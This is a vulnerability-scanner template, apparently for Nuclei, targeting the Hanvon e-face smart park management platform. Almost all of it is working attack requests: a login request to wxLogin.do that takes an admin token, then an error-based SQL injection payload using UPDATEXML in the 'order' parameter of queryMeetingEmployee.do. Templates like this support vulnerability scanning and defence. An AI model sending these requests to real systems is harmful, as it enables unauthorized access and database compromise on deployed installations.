id: poc-yaml-hw-e-face-pass-spmp-querymeetingemployee-sqli
info:
  name: 汉王e脸通智慧园区管理平台 queryMeetingEmployee SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Potential SQL Injection vulnerability in 汉王e脸通智慧园区管理平台 at the endpoint queryMeetingEmployee.do.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: token-extraction
    method: POST
    path:
      - "/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"userName\":\"admin\""
    extractors:
      - type: regex
        internal: true
        group: 1
        part: body
        regex:
          - "\"token\":\"(?P<token>.*?)\","

  - id: sqli-detection
    method: GET
    path:
      - "/manage/mobiMeetingApp/queryMeetingEmployee.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&meetingId=1&order=(UPDATEXML(2920,CONCAT(0x7e,md5({{t1}}),0x7e,(SELECT+(ELT(2920=2920,1)))),8357))"
    headers:
      token: "{{token}}"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "code"
          - "hanvon"
          - "XPATH syntax error"
          - "java.sql.SQLException"
          - "{{substr(t2,0,31)}}"
